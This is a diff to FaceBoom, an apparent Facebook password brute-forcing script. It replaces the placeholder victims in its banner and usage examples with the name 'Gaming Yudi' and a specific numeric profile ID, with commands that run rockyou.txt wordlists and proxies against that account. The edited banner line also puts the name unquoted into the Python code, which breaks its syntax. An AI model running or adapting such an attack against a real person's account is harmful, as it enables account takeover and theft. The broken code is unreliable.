@@ -111,7 +111,7 @@ class FaceBoom(object):
 ==================================
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
-[>] Target      :> """+wi+target+gr+"""
+[>] Target      :> """+wi+Gaming Yudi+gr+"""
 {}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+wi)
         if not single_passwd:
@@ -165,13 +165,13 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python faceboom.py -t Gaming Yudi -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python faceboom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python faceboom.py -t 100010115461407 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python faceboom.py -t Gaming Yudi -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python faceboom.py -t Victim@gmail.com -s 1234567
+     | python faceboom.py -t Gaming Yudi -s 1234567
      |--------
      | python faceboom.py -g https://www.facebook.com/Victim_Profile
      |--------
